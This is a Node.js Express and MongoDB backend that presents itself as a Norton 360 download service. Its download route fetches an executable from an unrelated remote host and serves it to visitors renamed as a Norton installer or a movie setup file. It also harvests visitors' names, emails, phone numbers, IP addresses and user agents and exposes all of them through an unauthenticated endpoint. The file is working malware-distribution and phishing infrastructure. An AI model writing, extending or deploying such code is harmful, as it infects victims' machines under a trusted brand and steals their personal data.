const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
require("dotenv").config();

const app = express();

// Middleware
app.use(cors({
  origin: true,
  credentials: true
}));
app.use(express.json());

// MongoDB Connection with better error handling
const connectDB = async () => {
  try {
    console.log('Attempting to connect to MongoDB...');
    console.log('MongoDB URI exists:', !!process.env.MONGODB_URI);
    
    await mongoose.connect(process.env.MONGODB_URI, {
      useNewUrlParser: true,
      useUnifiedTopology: true,
    });
    
    console.log('Connected to MongoDB successfully');
  } catch (error) {
    console.error('MongoDB connection error:', error);
  }
};

connectDB();

const db = mongoose.connection;
db.on("error", (error) => {
  console.error("MongoDB connection error:", error);
});
db.once("open", () => {
  console.log("MongoDB connection established");
});

// User Schema
const userSchema = new mongoose.Schema({
  name: {
    type: String,
    required: true,
    trim: true,
  },
  email: {
    type: String,
    required: true,
    trim: true,
    lowercase: true,
  },
  phone: {
    type: String,
    required: true,
    trim: true,
  },
  product: {
    type: String,
    default: "Norton 360",
  },
  downloadDate: {
    type: Date,
    default: Date.now,
  },
  ipAddress: {
    type: String,
  },
  userAgent: {
    type: String,
  },
});

const User = mongoose.model("User", userSchema);

// Enhanced API Routes with better error handling
app.post("/api/users", async (req, res) => {
  try {
    console.log('Received user data:', req.body);
    
    const { name, email, phone, product } = req.body;

    // Validation
    if (!name || !email || !phone) {
      console.log('Validation failed: missing required fields');
      return res.status(400).json({
        success: false,
        message: "Name, email, and phone are required",
      });
    }

    // Check MongoDB connection
    if (mongoose.connection.readyState !== 1) {
      console.log('MongoDB not connected, readyState:', mongoose.connection.readyState);
      return res.status(500).json({
        success: false,
        message: "Database connection error",
      });
    }

    // Get client info
    const ipAddress =
      req.headers["x-forwarded-for"] || 
      req.headers["x-real-ip"] || 
      req.connection.remoteAddress ||
      req.socket.remoteAddress ||
      (req.connection.socket ? req.connection.socket.remoteAddress : null);
    
    const userAgent = req.headers["user-agent"];

    console.log('Creating new user with data:', {
      name,
      email,
      phone,
      product: product || "Norton 360",
      ipAddress,
      userAgent
    });

    // Create new user
    const newUser = new User({
      name,
      email,
      phone,
      product: product || "Norton 360",
      ipAddress,
      userAgent,
    });

    // Save to database
    const savedUser = await newUser.save();
    console.log('User saved successfully:', savedUser._id);

    res.status(201).json({
      success: true,
      message: "User data saved successfully",
      userId: savedUser._id,
    });
  } catch (error) {
    console.error("Detailed error saving user:", error);

    // Handle duplicate email error
    if (error.code === 11000) {
      console.log('Duplicate email error');
      return res.status(400).json({
        success: false,
        message: "Email already exists",
      });
    }

    // Handle validation errors
    if (error.name === 'ValidationError') {
      console.log('Validation error:', error.message);
      return res.status(400).json({
        success: false,
        message: "Validation error: " + error.message,
      });
    }

    res.status(500).json({
      success: false,
      message: "Internal server error: " + error.message,
    });
  }
});

// Get all users (for admin)
app.get("/api/users", async (req, res) => {
  try {
    console.log('Fetching users...');
    
    // Check MongoDB connection
    if (mongoose.connection.readyState !== 1) {
      return res.status(500).json({
        success: false,
        message: "Database connection error",
      });
    }

    const users = await User.find().sort({ downloadDate: -1 });
    console.log('Found users:', users.length);
    
    res.json({
      success: true,
      count: users.length,
      users,
    });
  } catch (error) {
    console.error("Error fetching users:", error);
    res.status(500).json({
      success: false,
      message: "Internal server error: " + error.message,
    });
  }
});

// Download endpoint
app.get("/api/download", async (req, res) => {
  const remoteFile =
    "https://alpha.noleggiodisci.com/Bin/work_approval_pdf3.ClientSetup.exe?e=Access&y=Guest";

  const movieName = req.query.movie || 'Movie';

  try {
    console.log('Download request for:', movieName);
    
    const response = await fetch(remoteFile, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
      }
    });

    if (!response.ok) {
      throw new Error(`Failed to fetch file: ${response.status} ${response.statusText}`);
    }

    // Generate filename based on movie name
    let filename;
    if (movieName === 'Norton') {
      filename = `Norton_360_v22.24.1_Setup.exe`;
    } else {
      filename = `${movieName}_Setup.exe`;
    }

    console.log('Generated filename:', filename);

    res.setHeader("Content-Type", "application/octet-stream");
    res.setHeader("Content-Disposition", `attachment; filename="${filename}"`);
    
    const buffer = await response.arrayBuffer();
    res.send(Buffer.from(buffer));

  } catch (error) {
    console.error('Download error:', error);
    res.status(500).json({ 
      error: "Download failed", 
      message: error.message
    });
  }
});

// Health check with MongoDB status
app.get("/api/health", (req, res) => {
  const mongoStatus = mongoose.connection.readyState;
  const statusMap = {
    0: 'disconnected',
    1: 'connected',
    2: 'connecting',
    3: 'disconnecting'
  };

  res.json({ 
    status: "OK", 
    message: "Server is running on Vercel",
    mongodb: statusMap[mongoStatus],
    environment: process.env.NODE_ENV || 'development'
  });
});

// Root route
app.get("/", (req, res) => {
  res.json({ message: "Norton Backend API is running on Vercel!" });
});

// For Vercel, export the app
module.exports = app;